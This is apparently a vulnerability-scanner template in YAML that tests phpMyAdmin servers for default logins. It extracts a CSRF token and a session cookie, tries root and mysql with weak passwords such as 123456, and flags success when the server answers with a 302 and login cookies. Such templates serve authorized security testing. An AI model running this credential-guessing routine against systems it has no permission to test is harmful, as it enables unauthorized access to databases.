id: phpmyadmin-default-login

info:
  name: phpMyAdmin Default Login
  author: Natto97
  severity: high
  description: phpMyAdmin default admin credentials were discovered
  reference: 
    - https://www.phpmyadmin.net/
  tags: default-login,phpmyadmin

requests:
  - raw:
    - |
      GET /index.php HTTP/1.1
      Host: {{Hostname}}
      Upgrade-Insecure-Requests: 1
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
      Accept-Encoding: gzip, deflate
      Accept-Language: zh-CN,zh;q=0.9
      Connection: close
    - |
      POST /index.php HTTP/1.1
      Host: {{Hostname}}
      Content-Length: 103
      Cache-Control: max-age=0
      Upgrade-Insecure-Requests: 1
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
      Accept-Encoding: gzip, deflate
      Accept-Language: zh-CN,zh;q=0.9
      Cookie: pma_lang=zh_CN; pma_collation_connection=utf8_unicode_ci; phpMyAdmin={{token2}}
      Connection: close
      pma_username={{user}}&pma_password={{password}}&server=1&target=index.php&token={{token1}}
    attack: clusterbomb 
    payloads:
      user: 
        - root
        - mysql
      password: 
        - 123456
        - root
        - mysql

    extractors:
      - type: regex
        name: token1
        part: body
        internal: true
        group: 1
        regex:
          - ;token=(.*?)'></script>
      - type: regex
        name: token2
        part: header
        internal: true
        group: 1
        regex:
          -  phpMyAdmin=(.*?); path=

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: header
        words:
          - 'Set-Cookie: pmaUser'
          - 'Set-Cookie: pmaPas'
        condition: and